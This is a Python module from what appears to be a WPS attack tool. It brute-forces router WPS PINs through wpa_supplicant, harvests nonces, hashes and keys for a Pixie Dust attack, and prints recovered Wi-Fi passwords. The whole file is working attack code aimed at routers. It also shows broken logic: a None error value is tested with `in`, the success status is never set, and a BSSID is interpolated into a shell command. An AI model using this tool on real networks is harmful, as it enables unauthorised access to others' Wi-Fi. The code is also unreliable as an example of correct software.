import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs
import re

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''
        self.MODEL = ''    # Added for router model detection
        self.RETRIES = 0   # Added for retry tracking
        self.MAX_RETRIES = 3

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def shouldRetry(self) -> bool:
        """Determines if we should retry the connection."""
        if self.RETRIES < self.MAX_RETRIES:
            self.RETRIES += 1
            return True
        return False

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
        self.INTERFACE = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT = save_result
        self.PRINT_DEBUG = print_debug

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS = src.wps.pixiewps.Data()
        self.COLLECTION_RETRIES = 3
        self.COLLECTION_DELAY = 2  # seconds between retries

        self.TEMPDIR = tempfile.mkdtemp()
        self._setup_temp_config()
        self._setup_socket()

    def _setup_temp_config(self):
        """Sets up temporary configuration for wpa_supplicant."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            config = [
                f'ctrl_interface={self.TEMPDIR}',
                'ctrl_interface_group=root',
                'update_config=1',
                'ap_scan=1',
                'fast_reauth=1',
                'wps_cred_processing=1'  # Added for better WPS credential handling
            ]
            temp.write('\n'.join(config) + '\n')
            self.TEMPCONF = temp.name

    def _setup_socket(self):
        """Sets up the control socket for wpa_supplicant."""
        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

    def _collect_router_info(self, bssid: str):
        """Collects router information for better attack strategy."""
        try:
            # Get manufacturer info
            cmd = f"iwlist {self.INTERFACE} scanning | grep -A 5 '{bssid}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'ESSID' in line:
                    self.CONNECTION_STATUS.ESSID = line.split('"')[1]
                if 'Protocol' in line or 'Mode' in line:
                    self.CONNECTION_STATUS.MODEL = line
            
            # Set router info in pixie credentials
            self.PIXIE_CREDS.router_info = src.wps.pixiewps.RouterInfo.identify_router(
                bssid, self.CONNECTION_STATUS.MODEL
            )
            
        except Exception as e:
            print(f'[!] Warning: Could not collect router info: {e}')

    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                        showpixiecmd: bool = False, pixieforce: bool = False, 
                        pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        """Establish a WPS connection with enhanced data collection and retry logic."""
        
        if bssid and pixiemode:
            self._collect_router_info(bssid)

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator = src.wps.generator.WPSpin()
        collector = src.wifi.collector.WiFiCollector()

        # Enhanced PIN selection logic
        if not pin:
            if pixiemode:
                pin = self._get_stored_or_generate_pin(bssid, generator, pixiewps_dir)
            elif not pbc_mode:
                pin = generator.promptPin(bssid)
                if not pin:  # If no PIN could be generated based on algorithms
                    print("[!] No suitable PIN algorithm found for this device")
                    if input("[?] Try default PIN 12345670? [y/N] ").lower() != 'y':
                        return False
                    pin = '12345670'

        # Connection attempt with retry logic
        max_attempts = 3  # Limit total attempts
        attempt = 0
        last_error = None
        
        while attempt < max_attempts:
            try:
                if pbc_mode:
                    success = self._try_pbc_connection(bssid)
                else:
                    success = self._try_pin_connection(bssid, pin, pixiemode)
                    
                if success:
                    return True
                    
                if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                    if 'msg=7' in last_error:  # Protocol failure
                        print("[!] WPS protocol failure detected - device may have locked WPS or be incompatible")
                        break
                    elif 'Received M5' in last_error:  # First half of PIN is correct
                        print("[+] First half of PIN is correct, trying to optimize second half...")
                        # Could add specific handling for second half optimization here
                
                # If Pixie Dust is enabled and regular attempt failed, try it
                if not success and pixiemode and attempt == 0:  # Only try Pixie once
                    success = self._try_pixie_dust_attack(bssid, showpixiecmd, pixieforce, store_pin_on_fail)
                    if success:
                        return True
                
            except KeyboardInterrupt:
                if store_pin_on_fail:
                    collector.writePin(bssid, pin)
                return False

            attempt += 1
            if attempt < max_attempts:
                print(f'[*] Retry {attempt}/{max_attempts}')
                time.sleep(self.COLLECTION_DELAY * 2)  # Increased delay between attempts
            
        if store_pin_on_fail:
            collector.writePin(bssid, pin)
            
        return False

    def _get_stored_or_generate_pin(self, bssid: str, generator, pixiewps_dir) -> str:
        """Gets stored PIN or generates a new one."""
        try:
            filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
            with open(filename, 'r', encoding='utf-8') as file:
                t_pin = file.readline().strip()
                if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                    return t_pin
        except FileNotFoundError:
            pass
        return generator.getLikely(bssid) or '12345670'

    def _try_pbc_connection(self, bssid: str) -> bool:
        """Attempts a PBC mode connection."""
        self._wpsConnection(bssid, pbc_mode=True)
        self.CONNECTION_STATUS.BSSID = bssid
        return self.CONNECTION_STATUS.STATUS == 'GOT_PSK'

    def _try_pin_connection(self, bssid: str, pin: str, pixiemode: bool) -> bool:
        """Attempts a PIN-based connection with improved error handling."""
        if not pin:
            return False
            
        print(f'[*] Trying PIN: {pin}')
        self._wpsConnection(bssid, pin, pixiemode)
        
        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            return True
        elif self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
            # Check if we got far enough to validate first half
            if self.CONNECTION_STATUS.isFirstHalfValid():
                print('[+] First half of PIN is valid')
                return False
            elif 'msg=7' in getattr(self, 'last_error', ''):
                print('[!] WPS protocol failure - skipping further attempts with this PIN')
                return False
        
        return False

    def _try_pixie_dust_attack(self, bssid: str, showpixiecmd: bool, pixieforce: bool, store_pin_on_fail: bool) -> bool:
        """Attempts a Pixie Dust attack."""
        if self.PIXIE_CREDS.getAll():
            pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
            if pin:
                return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
        else:
            print('[!] Not enough data to run Pixie Dust attack')
            if self.PIXIE_CREDS.router_info:
                print(f'[!] Missing fields for {self.PIXIE_CREDS.router_info.manufacturer}:')
                for field in self.PIXIE_CREDS.router_info.required_data:
                    if not getattr(self.PIXIE_CREDS, field, ''):
                        print(f'  - {field}')
        return False

    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Enhanced WPA supplicant output handling with better data collection."""
        line = self.WPAS.stdout.readline()

        if not verbose:
            verbose = self.PRINT_DEBUG
        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            self._handle_wps_message(line, pixiemode)
        elif 'WPS-FAIL' in line:
            self._handle_wps_failure(line)

        return True

    def _handle_wps_message(self, line: str, pixiemode: bool):
        """Handles WPS protocol messages."""
        if 'M2D' in line:
            print('[-] Received WPS Message M2D')
            src.utils.die('[-] Error: AP is not ready yet, try later')
            
        if 'Building Message M' in line:
            n = int(line.split('Building Message M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            print(f'[*] Sending WPS Message M{n}…')
            
        elif 'Received M' in line:
            n = int(line.split('Received M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            print(f'[*] Received WPS Message M{n}')
            if n == 5:
                print('[+] The first half of the PIN is valid')
                
        elif 'Received WSC_NACK' in line:
            self._handle_wsc_nack()
            
        # Enhanced data collection for Pixie Dust
        self._collect_pixie_data(line, pixiemode)

    def _handle_wsc_nack(self):
        """Handles WPS NACK messages with detailed error reporting."""
        self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
        print('[-] Received WSC NACK')
        print('[-] Error: wrong PIN code')
        
        if self.PIXIE_CREDS.router_info:
            print(f'[*] Router type: {self.PIXIE_CREDS.router_info.manufacturer} '
                  f'({self.PIXIE_CREDS.router_info.vulnerability_type})')
            print('[*] Available attack strategies: ' + 
                  ', '.join(self.PIXIE_CREDS.router_info.attack_strategy))

    def _collect_pixie_data(self, line: str, pixiemode: bool):
        """Collects data needed for Pixie Dust attack."""
        if 'Enrollee Nonce' in line and 'hexdump' in line:
            self.PIXIE_CREDS.E_NONCE = self._getHex(line)
            if pixiemode:
                print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
                
        elif 'Registrar Nonce' in line and 'hexdump' in line:
            self.PIXIE_CREDS.R_NONCE = self._getHex(line)
            if pixiemode:
                print(f'[P] R-Nonce: {self.PIXIE_CREDS.R_NONCE}')
                
        elif 'DH own Public Key' in line and 'hexdump' in line:
            self.PIXIE_CREDS.PKR = self._getHex(line)
            if pixiemode:
                print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
                
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self.PIXIE_CREDS.PKE = self._getHex(line)
            if pixiemode:
                print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
                
        elif 'AuthKey' in line and 'hexdump' in line:
            self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
            if pixiemode:
                print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
                
        elif 'E-Hash1' in line and 'hexdump' in line:
            self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
            if pixiemode:
                print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
                
        elif 'E-Hash2' in line and 'hexdump' in line:
            self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
            if pixiemode:
                print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
                
        # Additional data for modern routers
        elif 'E-S1' in line and 'hexdump' in line:
            self.PIXIE_CREDS.E_S1 = self._getHex(line)
            if pixiemode:
                print(f'[P] E-S1: {self.PIXIE_CREDS.E_S1}')
                
        elif 'E-S2' in line and 'hexdump' in line:
            self.PIXIE_CREDS.E_S2 = self._getHex(line)
            if pixiemode:
                print(f'[P] E-S2: {self.PIXIE_CREDS.E_S2}')

    def _handle_wps_failure(self, line: str):
        """Handles WPS failure messages with improved error detection."""
        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
        
        if 'Received Error Indication' in line:
            print('[-] Received Error Indication - AP might have locked WPS')
            print('[!] Waiting 60 seconds before next attempt...')
            time.sleep(60)  # Add delay for locked WPS
        elif 'Failed to initialize WPS' in line:
            print('[-] Failed to initialize WPS - AP might not support WPS')
        elif 'Timed out waiting for AP response' in line:
            print('[-] Timed out waiting for AP response - AP might be busy')
            time.sleep(5)  # Add delay for timeout
        elif 'msg=7' in line:
            print('[-] WPS protocol failure (Message 7) - Device may be incompatible or locked')
            if 'config_error=0' in line:
                print('[!] Device reported no specific error - might be using non-standard WPS implementation')
        else:
            print(f'[-] WPS operation failed: {line}')
        
        self.last_error = line  # Store last error for analysis

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        """Outputs details about WPA supplicant errors"""

        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        """Prints network credentials after success"""

        print(f'[+] WPS PIN: \'{wps_pin}\'')
        print(f'[+] WPA PSK: \'{wpa_psk}\'')
        print(f'[+] AP SSID: \'{essid}\'')

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        print('[*] Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.WPAS.communicate()[0])
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                       pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Handles WPS connection process"""

        self.PIXIE_CREDS.clear()
        self.CONNECTION_STATUS.clear()
        self.WPAS.stdout.read(300) # Clean the pipe

        if not verbose:
            verbose = self.PRINT_DEBUG

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f'[*] Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self._sendAndReceive(cmd)

        if 'OK' not in r:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            print(self._explainWpasNotOkStatus(cmd, r))
            return False

        while True:
            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)

            if not res:
                break
            if self.CONNECTION_STATUS.STATUS == 'WSC_NACK':
                break
            if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
                break
            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                break

        self._sendOnly('WPS_CANCEL')
        return False

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        self.RETSOCK.close()
        self.WPAS.terminate()
        os.remove(self.RES_SOCKET_FILE)
        shutil.rmtree(self.TEMPDIR, ignore_errors=True)
        os.remove(self.TEMPCONF)

    def __del__(self):
        try:
            self._cleanup()
        except Exception:
            pass
